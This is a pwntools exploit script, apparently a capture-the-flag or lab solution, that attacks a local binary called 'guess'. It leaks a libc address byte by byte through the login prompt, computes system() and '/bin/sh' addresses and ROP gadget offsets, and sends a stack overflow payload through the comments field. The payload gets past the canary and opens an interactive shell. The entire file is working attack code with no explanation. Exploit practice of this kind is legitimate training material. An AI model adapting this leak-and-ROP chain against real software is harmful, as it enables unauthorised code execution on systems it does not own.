from pwn import *

# start the program
io = process('./guess')

# get context
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# input()

# get the address of libc
libc_addr = 0
libc_addr_shadow = b''
for i in range(6):
    for j in range(1, 256):
        # choice
        io.sendlineafter(b'Choice:', b'1')

        # login
        account = password = b'A' * 16  # padding
        account = account + libc_addr_shadow + bytes([j])
        io.sendafter(b'Account:', account)
        io.sendafter(b'Password:', password)
        ret = io.recvuntil(b'l')
        if (ret != b' Login fail'):
            libc_addr = j * (256 ** i) + libc_addr
            libc_addr_shadow += bytes([j])
            io.sendlineafter(b'comments:', b'A')
            break

# print("libc_addr: ", hex(libc_addr))

# get the base address of libc
padding = 88

system_addr = libc_addr - 0x7fc78f1346a0 + 0x7fc78ef6ad60
# print("system_addr: ", hex(system_addr))

shellcode_addr = system_addr - \
    libc.symbols["system"] + next(libc.search(b'/bin/sh'))
# print("shellcode_addr: ", hex(shellcode_addr))

# gadget1: pop rdi; ret
gadget1_addr = system_addr - libc.symbols["system"] + 0x2a3e5
# print("popcode_addr: ", hex(gadget_addr))

# gadget2: ret
gadget2_addr = system_addr - libc.symbols["system"] + 0x29cd6

# launch the bash
io.sendlineafter(b'Choice:', b'1')
io.sendafter(b'Account:', b'A\x00')
io.sendafter(b'Password:', b'A\x00')

# skip the canary
payload = b'C' * 64 + bytes([padding - 1]) + \
    p64(gadget1_addr) + p64(shellcode_addr) + \
    p64(gadget2_addr) + p64(system_addr) + b'\x0a'
# print("payload: ", payload)

io.sendafter(b'comments:', payload)

# interactive
io.interactive()
